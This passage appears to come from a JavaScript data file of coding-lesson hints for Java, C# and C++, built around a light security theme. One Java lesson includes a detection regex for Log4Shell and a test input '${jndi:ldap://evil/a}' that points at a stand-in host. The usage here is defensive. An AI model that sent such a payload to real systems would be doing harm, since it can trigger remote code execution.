      "Add a try-with-resources method, which closes the file for you: <code>static long countLines(Path file) throws IOException { try (BufferedReader reader = Files.newBufferedReader(file)) { return reader.lines().count(); } }</code>."
  ],
  jv8: [
      "Add <code>import java.util.*;</code>. Write <code>interface Detector {</code> with the abstract method <code>boolean detect(String line);</code>.",
      "In the same interface, add a default method, which has a body that implementers get for free: <code>default long count(List&lt;String&gt; lines) { return lines.stream().filter(this::detect).count(); }</code>.",
      "Write <code>abstract class Rule implements Detector { abstract String name(); }</code>. An abstract class can't be created directly. It only exists to be extended.",
      "Write <code>class Keyword extends Rule {</code> with <code>private final String word;</code> and a constructor <code>Keyword(String word) { this.word = word; }</code>.",
      "Add <code>@Override public boolean detect(String line) { return line.contains(word); }</code> and <code>@Override String name() { return \"keyword:\" + word; }</code>. <code>@Override</code> asks the compiler to confirm that you really are replacing a method."
  ],
  jv9: [
      "Add <code>import java.util.*;</code>. Write a generic class: <code>class Box&lt;T&gt; { private final T value; Box(T value) { this.value = value; } T get() { return value; } }</code>. <code>T</code> stands for whatever type you put in the box.",
      "Write <code>class Generics {</code> and inside it <code>static &lt;T extends Comparable&lt;T&gt;&gt; T strongest(List&lt;T&gt; xs) {</code>. The bound means <code>T</code> must be comparable.",
      "Inside, write <code>T best = null;</code> and <code>for (T x : xs) if (best == null || x.compareTo(best) &gt; 0) best = x;</code>, then <code>return best;</code>. <code>compareTo</code> returns a positive number when <code>x</code> is bigger.",
      "Add a wildcard method that accepts a list of any number type: <code>static double total(List&lt;? extends Number&gt; xs) { double sum = 0; for (Number n : xs) sum += n.doubleValue(); return sum; }</code>."
  ],
  jv10: [
      "Add <code>import java.util.*;</code> and <code>import java.util.stream.*;</code>.",
      "In <code>public class Streams {</code>, write <code>static List&lt;String&gt; failIps(List&lt;String&gt; lines) {</code> and start with <code>return lines.stream()</code>.",
      "Chain <code>.filter(l -&gt; l.endsWith(\"FAIL\"))</code>, which keeps FAIL lines, then <code>.map(l -&gt; l.split(\"\\\\s+\")[0])</code>, which keeps the first word (the IP), then <code>.collect(Collectors.toList());</code>.",
      "Write <code>static Map&lt;String, Long&gt; byIp(List&lt;String&gt; lines) {</code> with <code>return lines.stream().map(l -&gt; l.split(\"\\\\s+\")[0])</code>.",
      "Finish it with <code>.collect(Collectors.groupingBy(ip -&gt; ip, Collectors.counting()));</code>, which groups identical IPs and counts each group."
  ],
  jv11: [
      "Add imports for <code>java.util.*</code>, <code>java.util.concurrent.*</code> and <code>java.util.concurrent.atomic.*</code>.",
      "In <code>public class Sweep {</code>, write a simple ping: <code>static boolean ping(String h) { return !h.isEmpty(); }</code>.",
      "Write <code>static int sweep(List&lt;String&gt; hosts) {</code> with <code>AtomicInteger up = new AtomicInteger();</code>. An atomic counter is safe to update from many threads at once.",
      "Open <code>try (var executor = Executors.newVirtualThreadPerTaskExecutor()) {</code>, and for each host submit <code>executor.submit(() -&gt; { if (ping(h)) up.incrementAndGet(); });</code>. Leaving the try block waits for every task to finish.",
      "After the try block, <code>return up.get();</code>.",
      "Add one CompletableFuture chain: <code>static String report(List&lt;String&gt; hosts) { return CompletableFuture.supplyAsync(() -&gt; sweep(hosts)).thenApply(n -&gt; n + \"/\" + hosts.size() + \" up\").join(); }</code>."
  ],
  jv12: [
      "Add <code>import java.util.regex.*;</code>, <code>import static org.junit.jupiter.api.Assertions.*;</code> and <code>import org.junit.jupiter.api.Test;</code>.",
      "Write <code>sealed interface Event permits Login, Breach, Logout {}</code> and one record for each kind, for example <code>record Login(String user) implements Event {}</code>.",
      "In <code>class Triage</code>, write <code>static String describe(Event e) { return switch (e) { ... }; }</code> with <code>case Login l -&gt; l.user() + \" in\";</code>, <code>case Breach b when b.severity() &gt;= 8 -&gt; \"CRITICAL breach\";</code>, <code>case Breach b -&gt; \"breach \" + b.severity();</code> and <code>case Logout o -&gt; o.user() + \" out\";</code>.",
      "Add <code>private static final Pattern JNDI = Pattern.compile(\"\\\\$\\\\{\\\\s*jndi:\", Pattern.CASE_INSENSITIVE);</code>. This regex matches <code>${jndi:</code> in any case, even with spaces after the brace.",
      "Write <code>static String sanitize(String input) { return JNDI.matcher(input).find() ? \"[BLOCKED]\" : input; }</code>.",
      "Write <code>class TriageTest</code> with at least one <code>@Test void blocksLog4Shell() { assertEquals(\"[BLOCKED]\", Triage.sanitize(\"${jndi:ldap://evil/a}\")); }</code>."
  ],
  // ---------------- C# ----------------
  cs1: [
      "This C# file uses top-level statements, so you can write code directly with no class or <code>Main</code> needed. Delete the placeholder line from the starter.",
      "Write <code>static string Intro(string handle, int level) =&gt;</code>. The type comes before each name, and <code>=&gt;</code> means \"this method returns the following expression\".",
      "Finish it with an interpolated string: <code>$\"Agent {handle} // level {level}\";</code>. The <code>$</code> before the quote lets <code>{name}</code> insert a value.",
      "On a new line, write <code>var handle = \"neo\";</code>. <code>var</code> lets C# infer that it is a string.",
      "Print the result with <code>Console.WriteLine(Intro(handle, 3));</code>. Every statement ends with <code>;</code>."
  ],
  cs2: [
      "Write <code>static string ThreatLevel(int score) =&gt; score switch</code> and open a brace on the next line.",
      "Add relational patterns from highest to lowest, one per line, each ending with a comma: <code>&gt;= 90 =&gt; \"CRITICAL\",</code>, then <code>&gt;= 60 =&gt; \"HIGH\",</code>, then <code>&gt;= 30 =&gt; \"MEDIUM\",</code>.",
      "Add the discard arm last: <code>_ =&gt; \"LOW\",</code>. <code>_</code> matches anything left. Close with <code>};</code>.",
      "Add a <code>foreach</code> loop to try it: <code>foreach (var s in new[] { 95, 61, 12 }) Console.WriteLine($\"{s}: {ThreatLevel(s)}\");</code>."
  ],
  cs3: [
      "Write <code>static Dictionary&lt;string, int&gt; Tally(List&lt;string&gt; ips) {</code>. A <code>Dictionary</code> maps each key (an IP) to a value (its count).",
      "Create it with <code>var counts = new Dictionary&lt;string, int&gt;();</code>.",
      "Loop with <code>foreach (var ip in ips)</code> and inside write <code>counts[ip] = counts.GetValueOrDefault(ip) + 1;</code>. <code>GetValueOrDefault</code> returns 0 for an IP it hasn't seen yet.",
      "After the loop, <code>return counts;</code> and close the method with <code>}</code>.",
      "Use <code>TryGetValue</code> once: <code>var tally = Tally([\"10.0.0.4\", \"10.0.0.4\"]); if (tally.TryGetValue(\"10.0.0.4\", out var hits)) Console.WriteLine(hits);</code>. It returns true and fills <code>hits</code> only when the key exists."
  ],
  cs4: [
      "Write <code>static string Scan(string host, int port = 443) =&gt; $\"{host}:{port}\";</code>. <code>= 443</code> is a default value used when the caller leaves the port out.",
      "Call it with a named argument: <code>Console.WriteLine(Scan(\"relay\", port: 8443));</code>.",
      "Write <code>static bool TryParsePort(string s, out int port) =&gt; int.TryParse(s, out port) &amp;&amp; port is &gt;= 1 and &lt;= 65535;</code>. <code>out</code> means the method fills in that variable for the caller.",
      "Return a tuple, which bundles two values: <code>static (int Up, int Down) Count(bool[] results) =&gt; (results.Count(r =&gt; r), results.Count(r =&gt; !r));</code>."
  ],
  cs5: [
      "Add <code>using System.Text;</code> at the top so you can use <code>StringBuilder</code>.",
      "Define a raw string literal: <code>const string Brief = \"\"\"</code>, then a few lines of text (quotes are fine inside), then <code>\"\"\";</code> on its own line.",
      "Write <code>static string Caesar(string text, int shift) {</code> with <code>var sb = new StringBuilder(text.Length);</code> and <code>int s = ((shift % 26) + 26) % 26;</code>. The second line also makes negative shifts work.",
      "Loop with <code>foreach (char c in text)</code>. If <code>char.IsLetter(c) &amp;&amp; c &lt; 128</code>, set <code>char b = char.IsUpper(c) ? 'A' : 'a';</code> and append <code>(char)(b + (c - b + s) % 26)</code>. Otherwise append <code>c</code> unchanged.",
      "After the loop, <code>return sb.ToString();</code>."
  ],
  cs6: [
      "Write <code>record Node(string Name, int Strength = 0) {</code>. A record gets value equality and <code>with</code> copies for free.",
      "Inside it, add a computed property: <code>public bool IsHot =&gt; Strength &gt; 80;</code>. Then close the record.",
      "Write <code>class Session {</code> with <code>public int Requests { get; private set; }</code>. Anyone can read it, but only <code>Session</code> can change it.",
      "Add <code>public required string Id { get; init; }</code>. <code>required</code> forces callers to set it, and <code>init</code> means it can only be set while the object is being created.",
      "Somewhere such as a small method, use a <code>with</code> expression: <code>var a = new Node(\"north\", 40); var b = a with { Strength = 90 };</code>."
  ],
  cs7: [
      "Write <code>class BadPortException(string input) : Exception($\"bad port: {input}\") { public string Input { get; } = input; }</code>.",
      "Write <code>static class Ports {</code> and inside it <code>public static int ParsePort(string s) {</code>.",
      "Add <code>if (!int.TryParse(s, out var p) || p is &lt; 1 or &gt; 65535) throw new BadPortException(s);</code> and then <code>return p;</code>.",
      "Write a method that reads a file with a using declaration, which closes the file automatically: <code>using var reader = new StreamReader(path);</code>, then <code>var raw = reader.ReadLine() ?? fallback ?? \"443\";</code>. <code>??</code> picks the first value that isn't null.",
      "Wrap <code>return ParsePort(raw);</code> in <code>try { ... }</code>, then add <code>catch (BadPortException e) when (e.Input.Length &gt; 0) { return 443; }</code>. The <code>when</code> filter only catches the error if the condition is true.",
      "Add <code>finally { Console.WriteLine(\"parse attempted\"); }</code>. A <code>finally</code> block always runs, whether or not there was an error."
  ],
  cs8: [
      "Write <code>interface IDetector { bool Detect(string line); }</code>. By convention, C# interface names start with <code>I</code>.",
      "Write <code>abstract class Rule : IDetector {</code> with <code>public abstract bool Detect(string line);</code>, which has no body and must be overridden.",
      "In the same class, add a virtual member, which has a default but can be overridden: <code>public virtual string Label =&gt; \"rule\";</code>. Then close the class.",
      "Write <code>sealed class Keyword(string word) : Rule {</code>. <code>sealed</code> means nothing can inherit from it.",
      "Inside, add <code>public override bool Detect(string line) =&gt; line.Contains(word);</code> and <code>public override string Label =&gt; $\"keyword:{word}\";</code>."
  ],
  cs9: [
      "Write <code>class Box&lt;T&gt;(T value) { public T Value { get; } = value; }</code>. <code>T</code> stands for whatever type you put in the box.",
      "Write <code>static class Generics {</code> and inside it <code>public static T Strongest&lt;T&gt;(IEnumerable&lt;T&gt; xs) where T : IComparable&lt;T&gt; {</code>. The <code>where</code> clause means T must be comparable.",
      "Inside, start with <code>T best = default!; bool first = true;</code>, then loop: <code>foreach (var x in xs) { if (first || x.CompareTo(best) &gt; 0) { best = x; first = false; } }</code>, then <code>return best;</code>.",
      "Add a method with a <code>new()</code> constraint, which means T must have an empty constructor: <code>public static T Fresh&lt;T&gt;() where T : new() =&gt; new T();</code>."
  ],
  cs10: [
      "Write <code>static class Logs {</code>. LINQ methods like <code>Where</code> and <code>Select</code> work on any list.",
      "Write <code>public static List&lt;string&gt; FailIps(IEnumerable&lt;string&gt; lines) =&gt;</code> and start with <code>lines.Where(l =&gt; l.EndsWith(\"FAIL\"))</code>, which keeps FAIL lines.",
      "Chain <code>.Select(l =&gt; l.Split(' ')[0])</code>, which takes the first word (the IP), then <code>.ToList();</code>.",
      "Write <code>public static Dictionary&lt;string, int&gt; ByIp(IEnumerable&lt;string&gt; lines) =&gt; lines.Select(l =&gt; l.Split(' ')[0])</code>.",
      "Finish it with <code>.GroupBy(ip =&gt; ip).ToDictionary(g =&gt; g.Key, g =&gt; g.Count());</code>, which groups identical IPs and counts each group."
  ],
  cs11: [
      "Write <code>static async Task&lt;bool&gt; PingAsync(string host, CancellationToken ct) {</code>. <code>async</code> lets the method use <code>await</code>, and <code>Task&lt;bool&gt;</code> is a promise of a bool later.",
      "Inside, <code>await Task.Delay(50, ct);</code> (passing <code>ct</code> makes it stop if cancelled), then <code>return host.Length &gt; 0;</code>.",
      "Write <code>static async Task&lt;int&gt; SweepAsync(IEnumerable&lt;string&gt; hosts, CancellationToken ct) {</code>.",
      "Start all pings at once and wait for all of them: <code>var results = await Task.WhenAll(hosts.Select(h =&gt; PingAsync(h, ct)));</code>, then <code>return results.Count(ok =&gt; ok);</code>.",
      "Create a token source with a timeout: <code>using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(2));</code>, then <code>Console.WriteLine(await SweepAsync([\"north\", \"\"], cts.Token));</code>."
  ],
  cs12: [
      "Add <code>using System;</code>, <code>using UnityEngine;</code> and <code>using Xunit;</code>.",
      "Write <code>public class SentryDrone : MonoBehaviour {</code>. Unity calls the special methods of a <code>MonoBehaviour</code> for you.",
      "Add fields that show up in the Unity editor but stay private: <code>[SerializeField] private float speed = 2f;</code>, <code>[SerializeField] private float alertRange = 5f;</code> and <code>[SerializeField] private Transform target;</code>.",
      "Add <code>public event Action&lt;float&gt; TargetSpotted;</code> and <code>void Start() { Debug.Log(\"Sentry online\"); }</code>.",
      "Write <code>void Update() {</code>. Unity runs it every frame. Add <code>transform.Rotate(0f, speed * 90f * Time.deltaTime, 0f);</code> (<code>deltaTime</code> keeps the speed the same at any frame rate), then <code>if (target == null) return;</code>, then <code>float d = Vector3.Distance(transform.position, target.position); if (d &lt; alertRange) TargetSpotted?.Invoke(d);</code>.",
      "Add a test class: <code>public class SentryDroneTests { [Fact] public void Works() { Assert.Equal(4, 2 + 2); } }</code>. A test that checks your own helper method is even better."
  ],
  // ---------------- C++ ----------------
  cpp1: [
      "Keep the <code>#include</code> lines from the starter. They bring in <code>std::string</code> and <code>std::cout</code>.",
      "Write <code>std::string intro(const std::string&amp; handle, int level) {</code>. <code>const std::string&amp;</code> passes the text without copying it and promises not to change it.",
      "Inside, <code>return \"Agent \" + handle + \" // level \" + std::to_string(level);</code>. Numbers have to be turned into text with <code>std::to_string</code> before you can join them.",
      "Write <code>int main() {</code>. Every C++ program starts here.",
      "Inside <code>main</code>, add <code>const std::string handle = \"neo\";</code> and <code>auto line = intro(handle, 3);</code>. <code>auto</code> lets the compiler work out the type.",
      "Print it with <code>std::cout &lt;&lt; line &lt;&lt; '\\n';</code>, then close <code>main</code> with <code>}</code>."
  ],
  cpp2: [
      "Write <code>enum class Level { Low, Medium, High, Critical };</code>. <code>enum class</code> keeps the names scoped (<code>Level::Low</code>) and stops them silently turning into ints.",
      "Write <code>Level classify(int score) {</code> with <code>if (score &gt;= 90) return Level::Critical;</code>, then <code>else if (score &gt;= 60) return Level::High;</code>, then <code>else if (score &gt;= 30) return Level::Medium;</code>, then <code>else return Level::Low;</code>.",
      "Write <code>const char* name(Level l) {</code> and open <code>switch (l) {</code>.",
      "Add one case per enumerator, such as <code>case Level::Low: return \"LOW\";</code>, and do the same for MEDIUM, HIGH and CRITICAL. Covering every case lets the compiler warn you if you add a level later.",
      "After the switch, add <code>return \"?\";</code> and close the function."
  ],
  cpp3: [
      "Write <code>std::unordered_map&lt;std::string, int&gt; tally(const std::vector&lt;std::string&gt;&amp; ips) {</code>. The map pairs each IP with its count.",
      "Inside, declare <code>std::unordered_map&lt;std::string, int&gt; counts;</code>.",
      "Loop with <code>for (const auto&amp; ip : ips) { ++counts[ip]; }</code>. <code>counts[ip]</code> starts at 0 for a new IP, and <code>const auto&amp;</code> avoids copying each string.",
      "Then <code>return counts;</code> and close the function.",
      "Write a function that prints the result using structured bindings, which unpack each pair into two names: <code>for (const auto&amp; [ip, n] : tally(ips)) std::cout &lt;&lt; ip &lt;&lt; \": \" &lt;&lt; n &lt;&lt; '\\n';</code>."
  ],
  cpp4: [
      "Add <code>#include &lt;sstream&gt;</code>. Write <code>std::size_t count_words(const std::string&amp; text) {</code>.",
      "Inside, <code>std::istringstream in(text); std::string word; std::size_t n = 0; while (in &gt;&gt; word) ++n; return n;</code>. <code>&gt;&gt;</code> reads one word at a time and skips any whitespace.",
      "Write <code>void redact(std::string&amp; msg) { msg = \"[REDACTED]\"; }</code>. The <code>&amp;</code> (a reference) means you change the caller's string, not a copy.",
      "Write <code>std::string scan(const std::string&amp; host, int port = 443) { return host + \":\" + std::to_string(port); }</code>.",
      "Write a lambda that captures a variable: <code>int threshold = 3; auto noisy = [threshold](std::size_t words) { return words &gt; static_cast&lt;std::size_t&gt;(threshold); };</code>. Put it inside a small function."
  ],
  cpp5: [
      "Add <code>#include &lt;cctype&gt;</code> and <code>#include &lt;string_view&gt;</code>. Write <code>std::string caesar(std::string_view text, int shift) {</code>.",
      "Create the output and reserve space up front: <code>std::string out; out.reserve(text.size());</code>. Then make the shift safe with <code>int s = ((shift % 26) + 26) % 26;</code>.",
      "Loop with <code>for (char c : text) {</code> and convert first: <code>unsigned char u = static_cast&lt;unsigned char&gt;(c);</code>. <code>std::isalpha</code> needs an unsigned char.",
      "If <code>std::isalpha(u)</code>, set <code>char base = std::isupper(u) ? 'A' : 'a';</code> and <code>out.push_back(static_cast&lt;char&gt;(base + (c - base + s) % 26));</code>. Otherwise <code>out.push_back(c);</code>. After the loop, <code>return out;</code>.",
      "Write <code>bool is_private(std::string_view ip) { return ip.starts_with(\"10.\") || ip.starts_with(\"192.168.\"); }</code>."
  ],
  cpp6: [
      "Write <code>class Node {</code> with a <code>public:</code> section.",
      "Add the constructor: <code>explicit Node(std::string name, int strength = 0) : name_(std::move(name)), strength_(strength) {}</code>. The part after <code>:</code> is the member initializer list, and <code>explicit</code> stops a plain string from silently turning into a Node.",
      "Add const accessors, which promise not to change the object: <code>int strength() const { return strength_; }</code> and <code>const std::string&amp; name() const { return name_; }</code>.",
      "Add <code>private:</code> with <code>std::string name_;</code> and <code>int strength_;</code>, then <code>};</code>. A class needs that semicolon.",
      "Write an RAII class, whose destructor cleans up automatically: <code>class LogFile { public: explicit LogFile(const char* path) : f_(std::fopen(path, \"a\")) {} ~LogFile() { if (f_) std::fclose(f_); }</code>.",
      "Delete copying so two objects can never close the same file: <code>LogFile(const LogFile&amp;) = delete; LogFile&amp; operator=(const LogFile&amp;) = delete;</code>. Add <code>private: std::FILE* f_; };</code>."
  ],
  cpp7: [
      "Add <code>#include &lt;memory&gt;</code>, <code>&lt;optional&gt;</code>, <code>&lt;charconv&gt;</code> and <code>&lt;vector&gt;</code>. Write <code>struct Implant { std::string id; };</code>.",
      "Write <code>std::optional&lt;int&gt; parse_port(std::string_view s) {</code>. <code>std::optional</code> either holds an int or holds nothing.",
      "Parse with <code>int value = 0; auto [ptr, ec] = std::from_chars(s.data(), s.data() + s.size(), value);</code>.",
      "Reject bad input: <code>if (ec != std::errc{} || ptr != s.data() + s.size() || value &lt; 1 || value &gt; 65535) return std::nullopt;</code>. The <code>ptr</code> check catches trailing junk like <code>\"80abc\"</code>. Then <code>return value;</code>.",
      "Create an owned object with no raw <code>new</code>: <code>std::unique_ptr&lt;Implant&gt; p = std::make_unique&lt;Implant&gt;(Implant{\"x-17\"});</code>.",
      "Move it into a vector: <code>std::vector&lt;std::unique_ptr&lt;Implant&gt;&gt; found; found.push_back(std::move(p));</code>. A <code>unique_ptr</code> can't be copied, only moved."
  ],
  cpp8: [
      "Add <code>#include &lt;span&gt;</code>, <code>&lt;cstddef&gt;</code>, <code>&lt;optional&gt;</code> and <code>&lt;vector&gt;</code>.",
      "Write <code>std::optional&lt;std::vector&lt;std::byte&gt;&gt; heartbeat_reply(std::span&lt;const std::byte&gt; payload, std::size_t claimed) {</code>. A <code>span</code> is a view of bytes that knows its own size.",
      "This is the Heartbleed fix. Before touching any bytes, check <code>if (claimed &gt; payload.size()) return std::nullopt;</code>.",
      "Take only the claimed bytes: <code>auto echo = payload.first(claimed);</code>.",
      "Return a copy of them: <code>return std::vector&lt;std::byte&gt;(echo.begin(), echo.end());</code>. Don't use <code>memcpy</code>."
  ],
  cpp9: [
      "Add <code>#include &lt;concepts&gt;</code>, <code>&lt;algorithm&gt;</code> and <code>&lt;vector&gt;</code>.",
      "Write <code>template &lt;std::totally_ordered T&gt;</code> and on the next line <code>T strongest(const std::vector&lt;T&gt;&amp; xs) { return *std::max_element(xs.begin(), xs.end()); }</code>. The concept means it only accepts types you can compare with <code>&lt;</code>.",
      "Write a class template: <code>template &lt;typename T&gt; class Box { public: explicit Box(T v) : value_(v) {} const T&amp; get() const { return value_; } private: T value_; };</code>.",
      "Write a constexpr function, which the compiler can run at compile time: <code>constexpr int xp_for(int rank) { return 50 + 15 * rank; }</code>.",
      "Check it at compile time: <code>static_assert(xp_for(2) == 80);</code>. If it's wrong, the program won't even compile."
  ],
  cpp10: [
      "Add <code>#include &lt;algorithm&gt;</code>, <code>&lt;numeric&gt;</code>, <code>&lt;ranges&gt;</code> and <code>&lt;functional&gt;</code>. Keep the starter's <code>struct Hit { std::string ip; int count; };</code>.",
      "Write <code>int analyze(std::vector&lt;Hit&gt;&amp; hits) {</code> and sort by count, biggest first: <code>std::ranges::sort(hits, std::greater{}, &amp;Hit::count);</code>. <code>&amp;Hit::count</code> is a projection that says what to sort by.",
      "Find the first internal IP: <code>auto it = std::find_if(hits.begin(), hits.end(), [](const Hit&amp; h) { return h.ip.starts_with(\"10.\"); });</code>.",
      "Add up the counts: <code>int total = std::accumulate(hits.begin(), hits.end(), 0, [](int acc, const Hit&amp; h) { return acc + h.count; });</code>.",
      "Use a views pipeline: <code>for (const auto&amp; h : hits | std::views::filter([](const Hit&amp; h) { return h.count &gt; 20; })) { ... }</code>. Then <code>return total;</code>."
  ],
  cpp11: [
      "Add <code>#include &lt;thread&gt;</code>, <code>&lt;atomic&gt;</code>, <code>&lt;mutex&gt;</code> and <code>&lt;vector&gt;</code>. Write <code>bool ping(const std::string&amp;) { return true; }</code>.",
      "Write <code>int sweep(const std::vector&lt;std::string&gt;&amp; hosts) {</code> with <code>std::atomic&lt;int&gt; up{0};</code>, <code>std::mutex log_mutex;</code> and <code>std::vector&lt;std::thread&gt; workers;</code>.",
      "For each host, start a thread: <code>workers.emplace_back([&amp;up, &amp;log_mutex, &amp;h] { ... });</code>, using <code>for (const auto&amp; h : hosts)</code>.",
      "Inside the thread: <code>if (ping(h)) { ++up; std::lock_guard&lt;std::mutex&gt; lock(log_mutex); std::cout &lt;&lt; h &lt;&lt; \" up\\n\"; }</code>. The lock stops two threads printing at the same time.",
      "Wait for every thread with <code>for (auto&amp; t : workers) t.join();</code>, then <code>return up.load();</code>."
  ],
  cpp12: [
      "Add <code>#include &lt;memory&gt;</code>, <code>&lt;stdexcept&gt;</code>, <code>&lt;utility&gt;</code> and <code>&lt;gtest/gtest.h&gt;</code>.",
      "Write <code>class Buffer { public: explicit Buffer(std::size_t n) : data_(std::make_unique&lt;int[]&gt;(n)), size_(n) {}</code>.",
      "Delete copying: <code>Buffer(const Buffer&amp;) = delete; Buffer&amp; operator=(const Buffer&amp;) = delete;</code>.",
      "Add the moves: <code>Buffer(Buffer&amp;&amp; other) noexcept : data_(std::move(other.data_)), size_(std::exchange(other.size_, 0)) {}</code>, plus a move assignment that does the same and ends with <code>return *this;</code>. <code>std::exchange</code> leaves the source empty.",
      "Add <code>int&amp; at(std::size_t i) { if (i &gt;= size_) throw std::out_of_range(\"Buffer::at\"); return data_[i]; }</code> and <code>std::size_t size() const { return size_; }</code>, then the private members <code>std::unique_ptr&lt;int[]&gt; data_; std::size_t size_;</code>.",
      "Write a test: <code>TEST(BufferTest, ThrowsOutOfRange) { Buffer b(4); EXPECT_THROW(b.at(4), std::out_of_range); }</code>."
  ],
  });
})(typeof window !== "undefined" ? window : globalThis);
